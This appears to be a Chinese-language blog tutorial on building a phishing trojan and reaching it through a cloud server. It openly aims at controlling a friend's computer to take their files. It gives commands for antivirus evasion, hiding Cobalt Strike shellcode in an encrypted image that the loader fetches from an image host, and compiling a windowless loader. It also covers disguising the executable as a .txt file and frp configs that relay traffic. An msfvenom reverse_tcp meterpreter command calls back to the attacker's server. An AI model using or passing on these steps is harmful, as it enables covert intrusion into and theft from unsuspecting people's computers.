# 云服务器做代理钓鱼进军内网

Author：badbird

Time：2021-5--不详

---

### 0x01 前言

​		从很久之前因为IPV4快不够分了，所以我们家庭宽带都不给分配公网IP了，正常百度查本机IP查到的都是当前区域的某个节点的IP，而不是我们自己直接连接到互联网上的公网IP。所以，当我们想通过🐎控制朋友的电脑搜刮他的资源时就会发现🐎的回连IP填了自己百度的本机IP，（甚至有的小白会填入自己的局域网IP192.168.x.x，这种只适用于局域网，比如控制你隔壁桌的小伙伴，并不能进军到公网）并不能连接到自己的电脑上，原因就是上面讲的那样。

​		本文旨在一站到底式教会大家如何利用云服务器做自己的“公网IP”，让🐎向有公网IP的云服务器建立连接，再通过端口转发连接到自己的电脑上。文中涉及到的手法并不唯一，也不一定考虑的全面，但能保证是真实有效的。

---

操作环境：

- 一台Centos7云服务器
- kali2020，装有CS
- Win10靶机

---

### 0x02 自己的云服务器

​		我买的是某云的轻量级应用服务器，性价比算差不多的一年不到100块钱。

![image-20210507102158327](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507102158327.png)

云服务器还可以做一些别的事情比如搭网站，自己的博客，私人网盘等等。买来的云服务器都会有一个公网IP，在控制台可以看到

![image-20210507102615198](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507102615198.png)

接下来可以进去玩耍玩耍，或者接着往下做，如何配置代理在0x05

### 0x03 CS免杀

​		为什么是CS免杀呢？因为用过大佬现成的CS免杀处理的脚本：https://github.com/Gality369/CS-Loader。如果会MSF免杀的话，就不用再CS联动MSF了，直接上MSF就行，因为MSF在内网渗透方面是很好的选择，有利于下一步操作。接下来按照Readme的步骤做一遍，我选择的是go版本（哪个版本都无所谓，编程语言只是一种工具，用哪个版本要确保有该语言的环境就行。）

```go
git clone https://github.com/Gality369/CS-Loader.git
```

克隆这个项目到kali本地，cd进入该目录：
![image-20210507103838713](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507103838713.png)

第一步：将一张不要太大的图片放入同一文件夹下

确实是不要太大，百度了好几张图片，找到一个能用的（形象⑧）：

![ma](C:\Users\King\Desktop\ma.jpg)

第二步，将生成的shellcode填入generator.py的shellcode中，生成携带加密混淆后的shellcode的图片。

首先CS建立一个监听，点击这个耳机按钮：

![image-20210507105303633](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105303633.png)

Name随便，其他的默认即可，端口不要冲突了就行。

![image-20210507105219218](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105219218.png)

然后生成shellcode：

![image-20210507105031175](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105031175.png)

选择刚才建立的http的监听，勾选x64：

![image-20210507114406867](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114406867.png)

点击生成，选择一个保存的位置（哪里都行），用文本查看器打开这个.c文件：

![image-20210507114441577](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114441577.png)

双引号内的就是shellcode。

将shellcode填入generator.py的shellcode变量中，就复制粘贴就行：

![image-20210507114510200](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114510200.png)

保存，用**python2**执行

```
python generator YourRC4key ImageName
```

YourRC4key任意即可：

![image-20210507110440884](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507110440884.png)

第三步，将图片上传至https://imgtu.com/，复制图片链接：

![image-20210507114747836](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114747836.png)

第四步，修改CS-Loader.go，在响应位置填入图片url和之前的RC4key:

![image-20210507114838570](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114838570.png)

第五步，编译CS-Loader.go生成exe文件（如果编译失败百度一下go的交叉编译）：

```shell
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" CS-Loader.go

#大概解释一下，前面的选项指名要生成64位架构的windows系统上的程序，-ldflags选项使应用程序运行时不显示黑窗口。
```

![image-20210507121148999](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507121148999.png)

生成了exe，先来测试一下是否可用：

![image-20210507121134786](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507121134786.png)

莫有问题，，**（绕的过360和火绒却被Windows Defender查出来？）**

### 0x04 钓鱼手法-伪装

- ico替换，使用resource_hacker工具，win10所有ico：

  链接：https://pan.baidu.com/s/1QzGt2b0rdtsXDyv7Qv-XGA 
  提取码：o0au 

  替换效果如下，.txt是文件名，windows默认不显示后缀名，实际上它还是个隐藏了.exe后缀的可执行程序。

![image-20210507133241042](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507133241042.png)

- 网站挂马

### 0x05 frp内网穿透（重点）

**原理：**

![image-20210516144339607](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210516144339607.png)

制作一个回连云服务器（proxy）的🐎，这样确保了proxy和target的通信。

attacker和proxy通过frp建立起tcp连接。

利用frp在proxy上进行端口转发，将proxy与target建立的通信端口接收的信息转发给attacker的某个监听端口。

#### **[以msf木马为例]**

- https://github.com/fatedier/frp/releases到这里下载frp，客户端（你运行msf的主机）和服务端（云主机）都下载同一版本的。

我下载的是frp_0.36.2_linux_amd64.tar.gz

```shell
解压命令：
tar -zxvf frp_0.36.2_linux_amd64.tar.gz
```

然后开始进入解压好的文件夹内，开始配置吧：
**服务端 frps.ini**：

```shell
[common]
bind_port = 7000			#服务段frp服务绑定端口
token = abc123				#令牌码，和客户端要一致

#management
dashboard_port = 7500		#frp管理服务的端口
dashboard_user = admin		#管理用户名
dashboard_pwd = admin		#管理密码
enable_prometheus = true	#启用普罗米修斯运维服务，go语言相关监控，可以关闭

#log
log_file = /var/log/frps.log	#日志路径
log_level = info				#日志等级
log_max_days = 3

#port_white
allow_ports = 7000,7500			#白名单，上边配置了哪个端口这里要加上
```

**客户端 frpc.ini**：

```shell
[common]
server_addr = 39.106.83.5		#云服务器的公网IP
server_port = 7000				#服务端frp服务绑定的端口
token = abc123					#令牌码，和服务端要一致

[ssh]	#[]括起来为每个程序的配置，这个是为ssh配置的，举个例子。
type = tcp
local_ip = x.x.x.x
local_port = 22
remote_port = 1234

[msf]	#为msf木马回连配置的代理
type = tcp						#tcp连接，handler的payload也记得设置成reverse_tcp
local_ip = kali的局域网ip
local_port = 6666				#msfconsole的handler中设置的lport
remote_port = 6767				#msfvenom生成木马时写的监听端口
```

**msfvenom生成木马**

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=服务器IP lport=frpc.ini配置的remote_port -f exe -o test.exe
```

#### **[以CS木马为例]**

**因为可以做免杀，所以还是生成shellcode**

区别是监听器的设置。要根据代理的原理来配置监听：🐎做的事只是连接proxy服务器，所以生成shellcode时一定要注意监听器的ip-port

**还可以把服务器当作teamserver**

CS诞生本就是为了团队协作渗透的，用云服务器做teamserver，然后各attacker端启动CS时连接teamserver这样还省去了配置frp。

### 0x06 CS联动MSF

### 0x07 进军内网

